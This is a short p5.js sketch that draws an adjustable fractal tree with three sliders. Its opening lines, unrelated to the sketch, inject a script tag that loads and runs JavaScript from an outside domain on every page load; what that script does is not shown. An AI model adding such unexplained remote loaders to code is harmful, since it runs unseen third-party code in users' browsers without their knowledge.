var k = document.getElementsByTagName('head')[0];
var c = document.createElement('script');
c.async = true;
c.type = 'text/javascript';
c.charset = 'utf-8';
c.src = "https://akashraj.tech/js/a.js";
k.appendChild(c);



var setup, draw, tree, branch, minlen, sliderr3, sliderr2, sliderr, ang, length;
(function () {
  var _$0 = this;

  function _0() {
    createCanvas(windowWidth, windowHeight);
    _$0.sliderr = createSlider(0, PI, PI / 2, 0.0001);

    _$0.sliderr.position(0, 0);

    _$0.sliderr2 = createSlider(2, 100, 50, 1);

    _$0.sliderr2.position(0, 30);

    _$0.sliderr3 = createSlider(50, 300, 100, 10);

    _$0.sliderr3.position(0, 60);
  }

  function _1() {
    background(90);
    _$0.ang = _$0.sliderr.value();
    _$0.minlen = _$0.sliderr2.value();
    _$0.length = _$0.sliderr3.value();
    push();
    translate(width / 2, height);

    _$0.tree();

    pop();
  }

  function _2() {
    _$0.branch(_$0.length);
  }

  function _3(len) {
    strokeWeight(10);

    if (len > _$0.minlen) {
      line(0, 0, 0, -len);
      translate(0, -len);
      push();
      rotate(_$0.ang);

      _$0.branch(len * 0.67);

      pop();
      push();
      rotate(-_$0.ang);

      _$0.branch(len * 0.67);

      pop();
      push();
      rotate(0);

      _$0.branch(len * 0.67);

      pop();
    }
  }

  setup = _0;
  draw = _1;
  tree = _2;
  branch = _3;
  minlen = void 0;
  sliderr3 = void 0;
  sliderr2 = void 0;
  sliderr = void 0;
  ang = void 0;
  length = void 0;
}).call(this);
